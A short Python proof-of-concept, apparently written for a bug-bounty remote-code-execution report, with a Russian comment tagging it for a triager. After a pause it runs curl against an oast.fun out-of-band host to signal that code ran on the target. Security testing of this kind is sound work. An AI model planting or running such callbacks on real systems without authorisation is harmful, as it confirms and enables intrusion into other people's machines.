# rce_test.py
import subprocess
import time

# Идентификатор для триажера: POC_RCE_EXPLOIT_PYTHON
time.sleep(5)
subprocess.run(["curl", "http://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/PYTHON_RCE_CONFIRMED"], shell=False)
